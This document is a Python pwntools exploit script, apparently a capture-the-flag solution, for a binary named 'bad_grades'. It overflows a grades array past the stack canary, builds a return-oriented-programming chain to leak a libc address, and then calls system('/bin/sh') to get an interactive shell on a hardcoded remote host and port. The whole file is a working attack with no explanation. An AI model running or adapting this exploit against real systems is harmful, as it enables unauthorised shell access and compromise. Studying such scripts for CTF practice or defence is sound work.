from pwn import *
import struct

def convert_to_double(value):
    double_val = p64(value).hex()
    double_val = struct.unpack('d', bytes.fromhex(double_val))[0]
    return str(double_val).encode()

def exploit(boolean):
    if boolean:
        r = remote('83.136.251.235', 47120)
    else:
        r = process('./bad_grades')
    
    context.log_level='debug'
    
    libc = ELF('./bad_grades', checksec=False)
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'grades: ', b'39')

    plt_addr = libc.plt['puts']
    got_addr = libc.got['puts']
    pop_rdi = 0x401263
    ret = 0x400666

    log.info(f"Address of GOT: {hex(got_addr)}")
    log.info(f"Address of PLT: {hex(plt_addr)}")

    for i in range(33):
        r.sendlineafter(b': ', b'999')                      # length 32
    
    r.sendlineafter(b': ', b'.')                            # [33]: bypass Canary
    r.sendlineafter(b': ', b'999')                          # [34]: RBP reg
    r.sendlineafter(b': ', convert_to_double(pop_rdi))      # [35]: pop rdi; ret
    r.sendlineafter(b': ', convert_to_double(got_addr))     # [36]
    r.sendlineafter(b': ', convert_to_double(plt_addr))     # [37]
    r.sendlineafter(b': ', convert_to_double(0x400fd5))     # [38]: Exploit again
                                                            # [39]: Maintain exploit
    
    r.recvline()

    address_leak = u64(r.recv(6).strip().ljust(8, b'\x00'))
    log.success(f"Success!!! Address leaked is: {hex(address_leak)}")

    binsh_addr = address_leak + 0x13337a
    system_addr = address_leak - 0x31550

    # r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'grades: ', b'39')

    log.info(f"Address of /bin/sh: {hex(binsh_addr)}")
    log.info(f"Address of PLT: {hex(system_addr)}")

    for i in range(33):
        r.sendlineafter(b': ', b'999')                      # length 32
    
    r.sendlineafter(b': ', b'.')                            # [33]: bypass Canary
    r.sendlineafter(b': ', b'999')                          # [34]: RBP reg
    r.sendlineafter(b': ', convert_to_double(ret))          # [35]: Align the stack
    r.sendlineafter(b': ', convert_to_double(pop_rdi))      # [36]: pop rdi; ret
    r.sendlineafter(b': ', convert_to_double(binsh_addr))   # [37]
    r.sendlineafter(b': ', convert_to_double(system_addr))  # [38]
                                                            # [39]: Maintain connecting shell
    r.interactive()

exploit(True)